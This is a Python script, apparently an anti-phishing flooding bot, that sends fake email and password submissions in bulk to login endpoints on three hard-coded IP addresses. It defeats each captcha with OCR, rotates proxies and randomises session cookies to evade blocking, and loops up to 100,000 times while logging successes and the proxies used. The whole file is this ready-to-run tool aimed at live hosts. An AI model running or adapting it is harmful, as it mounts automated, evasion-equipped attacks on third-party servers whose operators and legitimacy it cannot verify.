import json
from time import sleep
import time
import requests
import random
import os
from connect_utils import sleep_func, catch_except
from mock_data import gen_data

from ocr_utils import ocr_recognize
from proxy_utils import get_proxy
from log import logger


HEADER = {
    "Cookie": "PHPSESSID=66qvbhsj7fnmfs1po5f9g875n7",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0",

}

START_TIME = time.time()


class INFO:
    TOTAL = 0
    TOTAL_SUCCESS = 0
    used_ips = set()


def rand_cookies():
    alpha = list("abcdefghijklmnopqrstuvwxyz1234567890")
    cookies = "PHPSESSID="
    for i in range(26):
        cookies += random.choice(alpha)
    return cookies


@catch_except(sleep_time=0.)
@sleep_func("rand")
def hack_once(info: INFO, SUBMIT_URL, CAPTCHA_URL):
    info.TOTAL += 1
    # 1. 获取代理节点
    proxy_info = get_proxy()
    if "proxy" not in proxy_info.keys():
        logger.warn("获取proxy失败")
        return
    proxy = {}
    if proxy_info["https"]:
        proxy["http"] = "https://" + proxy_info["proxy"]
    else:
        proxy["http"] = "http://" + proxy_info["proxy"]
    info.used_ips.add(proxy["http"])
    # cookies
    cookies = rand_cookies()
    HEADER["Cookie"] = cookies
    # 获取ocr结果
    res = requests.get(CAPTCHA_URL, headers=HEADER, proxies=proxy, timeout=3)
    ocr_res = ocr_recognize(res.content)
    save_byte_to_img(res.content, ocr_res)

    # 请求假数据
    mock_data = gen_data()
    req_body = {
        "email": mock_data["email"],
        "password": mock_data["password"],
        "code": ocr_res
    }
    logger.info(f"模拟请求: {req_body}")
    res = requests.post(SUBMIT_URL, data=req_body,
                        headers=HEADER, proxies=proxy, timeout=3)
    res_data = json.loads(res.text)
    res_code = res_data["code"]
    if res_code == 1:
        info.TOTAL_SUCCESS += 1
    logger.info(f"{SUBMIT_URL} 返回结果: {res_data}")
    logger.info(
        f"hack res_code={res_code}, success/total={info.TOTAL_SUCCESS}/{info.TOTAL},"
            + f"effient: {format((time.time() - START_TIME)/info.TOTAL_SUCCESS, '.2f')} s/item")


def save_byte_to_img(img: bytes, name: str):
    path = os.path.join(".", "img", name+".png")
    with open(path, 'wb') as f:
        f.write(img)
        f.flush()
    logger.info(f"save img to {path}")


def main():
    SUBMIT_URL1 = "http://194.41.36.170/checklogin.php"
    CAPTCHA_URL1 = "http://194.41.36.170/code.php"

    SUBMIT_URL2 = "http://45.207.49.93/checklogin.php"
    CAPTCHA_URL2 = "http://45.207.49.93/code.php"

    SUBMIT_URL3 = "http://45.207.58.237/checklogin.php"
    CAPTCHA_URL3 = "http://45.207.58.237/code.php"
    info = INFO()
    for i in range(1000 * 100):
        hack_once(info, SUBMIT_URL2, CAPTCHA_URL2)
        hack_once(info, SUBMIT_URL1, CAPTCHA_URL1)
        # hack_once(info, SUBMIT_URL3, CAPTCHA_URL3)
        logger.info(f"使用过的代理数量: {len(info.used_ips)}")


if __name__ == "__main__":
    main()
    # curl http://127.0.0.1:5010/count/
